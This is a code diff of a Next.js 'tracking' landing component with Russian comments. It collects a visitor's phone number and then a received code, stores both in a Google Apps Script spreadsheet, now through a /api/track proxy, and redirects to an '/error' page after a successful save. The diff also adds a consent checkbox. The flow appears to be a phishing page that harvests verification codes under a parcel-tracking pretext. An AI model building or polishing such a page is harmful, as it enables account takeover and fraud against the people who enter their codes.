@@ -5,73 +5,69 @@ import { useRouter } from "next/navigation";
 
 export default function TrackingHero() {
   const [phone, setPhone] = useState("");
+  const [agree, setAgree] = useState(false); // <-- новое состояние
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [code, setCode] = useState("");
+  const [rowIndex, setRowIndex] = useState(null);
 
   const router = useRouter();
-
-  // Открываем модалку
-  // внутри компонента
-  const [rowIndex, setRowIndex] = useState(null);
 
   const handleSubmit = async () => {
     if (!phone.trim()) return alert("Введите номер телефона");
 
-    // 1) отправляем телефон в AppsScript → получаем rowIndex
+    // Проверка галочки
+    if (!agree) {
+      return alert("Вы должны дать согласие на обработку персональных данных");
+    }
+
+    // Нормализуем номер: оставляем только цифры
+    let cleanedPhone = phone.replace(/\D+/g, "");
+
+    if (!cleanedPhone) return alert("Некорректный номер");
+
     try {
-      const resp = await fetch(
-        "https://script.google.com/macros/s/AKfycbwlCOUQnlaXELnnAnQL42DGTqqdiNaz7a16_g2_056ZH95pkUDTPUZ52KGG5lTMNgi7LA/exec",
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            _secret: "YOUR_SECRET_TOKEN",
-            action: "addPhone",
-            phone,
-          }),
-        }
-      );
+      const resp = await fetch("/api/track", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          _secret: "SECRET",
+          action: "addPhone",
+          phone: cleanedPhone,
+        }),
+      });
+
       const data = await resp.json();
       if (!data.success) throw new Error(data.error || "Error");
-      setRowIndex(data.row); // сохраняем индекс строки
+
+      setRowIndex(data.row);
       setIsModalOpen(true);
     } catch (err) {
-      if (err instanceof Error) {
-        alert("Не удалось сохранить телефон: " + err.message);
-      } else {
-        alert("Не удалось сохранить телефон");
-      }
+      alert("Не удалось сохранить телефон");
     }
   };
 
-  // Подтверждение кода → отправка в таблицу → редирект
   const handleConfirm = async () => {
     if (code.length < 3) return alert("Введите корректный код");
 
     try {
-      const resp = await fetch(
-        "https://script.google.com/macros/s/AKfycbwlCOUQnlaXELnnAnQL42DGTqqdiNaz7a16_g2_056ZH95pkUDTPUZ52KGG5lTMNgi7LA/exec",
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            _secret: "YOUR_SECRET_TOKEN",
-            action: "appendCode",
-            row: rowIndex, // либо phone: phone
-            code,
-          }),
-        }
-      );
+      const resp = await fetch("/api/track", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          _secret: "SECRET",
+          action: "appendCode",
+          row: rowIndex,
+          code,
+        }),
+      });
+
       const data = await resp.json();
       if (!data.success) throw new Error(data.error || "Error");
+
       setIsModalOpen(false);
       router.push("/error");
     } catch (err) {
-      if (err instanceof Error) {
-        alert("Не удалось сохранить телефон: " + err.message);
-      } else {
-        alert("Не удалось сохранить телефон");
-      }
+      alert("Не удалось сохранить телефон");
     }
   };
 
@@ -138,16 +134,19 @@ export default function TrackingHero() {
             </div>
 
             <label className="flex items-start gap-2 text-sm text-gray-600">
-              <input type="checkbox" className="mt-1" />Я даю согласие на
-              обработку персональных данных.
+              <input
+                type="checkbox"
+                checked={agree}
+                onChange={(e) => setAgree(e.target.checked)} // <-- обновляем состояние
+                className="mt-1"
+              />
+              Я даю согласие на обработку персональных данных.
             </label>
           </div>
         </div>
       </section>
 
-      {/* =======================
-          МОДАЛЬНОЕ ОКНО ВВОДА КОДА
-      ========================== */}
+      {/* МОДАЛКА */}
       {isModalOpen && (
         <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50 px-4">
           <div className="bg-white p-6 rounded-2xl shadow-lg w-full max-w-sm">
